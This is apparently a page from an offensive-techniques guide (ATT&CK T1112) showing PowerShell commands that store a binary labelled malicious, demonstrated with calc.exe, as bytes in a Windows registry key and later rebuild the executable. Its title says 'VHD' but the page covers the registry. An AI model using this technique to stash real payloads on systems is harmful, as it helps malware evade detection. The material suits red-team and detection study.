# Hide data inside VHD on Windows - Procedure #1
In this procedure, we are going to hide a malicious binary `calc.exe` inside Registry Key. First, let's find a house for this binary by using the following command:
```
C:\> powershell
PS C:\> Get-ChildItem -Path "HKLM:\SOFTWARE\WOW6432Node"
```
![TA0003 - Persistence/T1112 - Modify Registry/Hide data inside Windows Registry/Screenshots/Screenshot 2026-03-20 115957.png](https://github.com/As3yE4de/OffensiveTechnicalGuides/blob/491c3324767b2ccc40d4bd40d354bf596a4cf7bc/TA0003%20-%20Persistence/T1112%20-%20Modify%20Registry/Hide%20data%20inside%20Windows%20Registry/Screenshots/Screenshot%202026-03-20%20115957.png)

We will create a new key for our binary in this key `HKLM\SOFTWARE\WOW6432Node`. In the Powershell prompt, we use the following command to create a new key in this 
house and add the bytes to our new key:
```
PS C:\> $file = "C:\testRegistryHiding\calc.exe"
PS C:\> $regPath = "HKLM:\SOFTWARE\WOW6432Node\malicious"
PS C:\> $keyName = "malicious"
PS C:\> $bytes = [System.IO.File]::ReadAllBytes($file)
PS C:\> if ( -not (Test-Path ($regPath))) { New-Item -Path $regPath -Force }
PS C:\> Set-ItemProperty -Path $regPath -Name $keyName -Value $bytes -Type Binary -Force
```
![TA0003 - Persistence/T1112 - Modify Registry/Hide data inside Windows Registry/Screenshots/Screenshot 2026-03-20 121757.png](https://github.com/As3yE4de/OffensiveTechnicalGuides/blob/41fceb15ac6de3375fc0a57240591736ac7fcfe4/TA0003%20-%20Persistence/T1112%20-%20Modify%20Registry/Hide%20data%20inside%20Windows%20Registry/Screenshots/Screenshot%202026-03-20%20121757.png)

We can confirm our success by using:
```
PS C:\> Get-ItemProperty -Path $regPath
```
![TA0003 - Persistence/T1112 - Modify Registry/Hide data inside Windows Registry/Screenshots/Screenshot 2026-03-20 122232.png](https://github.com/As3yE4de/OffensiveTechnicalGuides/blob/69e68612f8b123c7dccaa4a60e377a3d20d44e3a/TA0003%20-%20Persistence/T1112%20-%20Modify%20Registry/Hide%20data%20inside%20Windows%20Registry/Screenshots/Screenshot%202026-03-20%20122232.png)

After hiding, we can delete our binary. Whenever we want to retrieve this binary, just use the following command:
```
PS C:\> $outPath = "C:\testRegistryHiding\retrieved.exe"
PS C:\> $outValue = (Get-ItemProperty -Path $regPath -Name $keyName).$keyName
PS C:\> [System.IO.File]::WriteAllBytes($outPath, $outValue)
```
![TA0003 - Persistence/T1112 - Modify Registry/Hide data inside Windows Registry/Screenshots/Screenshot 2026-03-20 123014.png](https://github.com/As3yE4de/OffensiveTechnicalGuides/blob/872f9107c436dd3a211ad51ebcd0715e04440eec/TA0003%20-%20Persistence/T1112%20-%20Modify%20Registry/Hide%20data%20inside%20Windows%20Registry/Screenshots/Screenshot%202026-03-20%20123014.png)

![TA0003 - Persistence/T1112 - Modify Registry/Hide data inside Windows Registry/Screenshots/Screenshot 2026-03-20 123154.png](https://github.com/As3yE4de/OffensiveTechnicalGuides/blob/8a58bfc65ffcb4890dd7d975be6606cc3af85ca1/TA0003%20-%20Persistence/T1112%20-%20Modify%20Registry/Hide%20data%20inside%20Windows%20Registry/Screenshots/Screenshot%202026-03-20%20123154.png)

# Tested environment
- Windows 10 x64

---
